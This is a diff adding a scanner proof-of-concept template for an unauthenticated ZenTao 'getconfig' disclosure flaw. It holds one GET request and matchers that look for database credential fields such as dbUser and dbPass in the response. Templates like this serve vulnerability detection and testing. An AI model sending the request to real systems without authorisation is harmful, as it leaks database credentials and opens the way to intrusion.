@@ -1,0 +1,27 @@
+[info]
+id = "POC-AVE-2022-0028"
+name = "禅道 Easy Soft ALM getconfig 信息泄露 PoC"
+author = "AVE"
+severity = "high"
+tags = ["CWE-22", "信息泄露", "zentao", "禅道", "directory-traversal"]
+description = "禅道（Zentao）Easy Soft ALM 15.0 存在目录遍历漏洞，远程攻击者无需认证即可通过 /zentao/index.php?mode=getconfig 接口获取系统配置信息（包括数据库连接信息等敏感数据）"
+vuln_id = ["CVE-2022-37700", "AVE-2022-0028"]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/zentao/index.php?mode=getconfig"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["dbHost", "dbUser", "dbPass", "dbName", "dbhost", "dbuser", "dbpass", "config", "mysql"]
+condition = "or"
+expect = true
